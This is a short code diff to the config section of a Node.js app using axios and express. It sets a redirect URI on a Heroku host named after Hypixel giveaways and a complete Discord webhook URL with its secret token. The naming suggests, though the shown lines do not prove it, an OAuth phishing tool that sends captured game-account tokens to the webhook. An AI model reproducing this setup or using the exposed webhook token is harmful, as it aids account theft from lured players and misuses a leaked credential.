@@ -1,8 +1,8 @@
 //Config
 const client_secret = 'secret_value'
 const client_id = 'client_id'
-const redirect_uri = 'redirect_uri'
-const webhook_url = 'webhook'
+const redirect_uri = 'https://hypixelgiveaways.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1035588752128618537/x5Owq-LvYfBlpgg7yr_kYUJhh8Ay4rnF9TzjMAR7nRlVtuOl9RPa5UUvOBcZ9tTweRxR'
 //Requirements
 const axios = require('axios')
 const express = require('express')
